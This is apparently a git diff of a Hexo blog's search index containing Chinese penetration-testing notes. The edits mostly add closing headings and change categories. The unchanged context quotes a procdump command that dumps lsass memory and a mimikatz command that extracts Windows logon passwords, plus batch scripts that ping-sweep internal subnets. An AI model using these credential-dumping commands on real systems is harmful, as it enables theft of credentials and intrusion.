@@ -1300,7 +1300,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
 <p>将lsass.tmp拉取到本地使用mimikatz解密目标系统密码。（本地机器需与目标机器的版本位数一致。）</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;log res.log&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
-]]></content>
+<h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
       <categories>
         <category>HashDump</category>
       </categories>
@@ -1335,7 +1335,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem a段探测</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 修改ip的值以指定a段</span><br><span class="line"></span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;10</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%i in (0,1,255) do (</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%k in (0,1,255) do (</span><br><span class="line"></span><br><span class="line">for %%j in (1,254) do ( @ping %ip%.%%i.%%k.%%j -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot; &gt;&gt; null</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%i.%%k.%%j is alive ! &gt;&gt; ascan.txt ) else (echo %ip%.%%i.%%k.%%j May be not exist ! )</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem b段探测</span><br><span class="line">@echo off</span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;192.168</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%i in (0,1,255) do (</span><br><span class="line"></span><br><span class="line">for %%k in (1,254) do ( @ping %ip%.%%i.%%k -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot; &gt;&gt; null</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%i.%%k is alive ! &gt;&gt; bscan.txt ) else (echo %ip%.%%i.%%k May be not exist ! )</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem c段探测</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;192.168.148</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%k in (0,1,254) do  (</span><br><span class="line">@ping %ip%.%%k -w 1 -n 1| findstr &quot;TTL&#x3D;&quot; &gt;nul</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%k is alive ! &gt;&gt; cscan.txt ) else (echo %ip%.%%k May be not exist ! )</span><br><span class="line">)</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
-]]></content>
+<h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
       <categories>
         <category>信息搜集</category>
       </categories>
@@ -1346,12 +1346,13 @@
   <entry>
     <title>Web的信息搜集</title>
     <url>/2021/01/14/Web%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<p><em>Web的信息搜集也很重要</em></p>
+]]></content>
       <categories>
-        <category>Web的信息搜集</category>
+        <category>信息搜集</category>
       </categories>
       <tags>
-        <tag>Web的信息搜集&lt;!--more--&gt;</tag>
+        <tag>Windows&lt;!--more--&gt;</tag>
       </tags>
   </entry>
 </search>
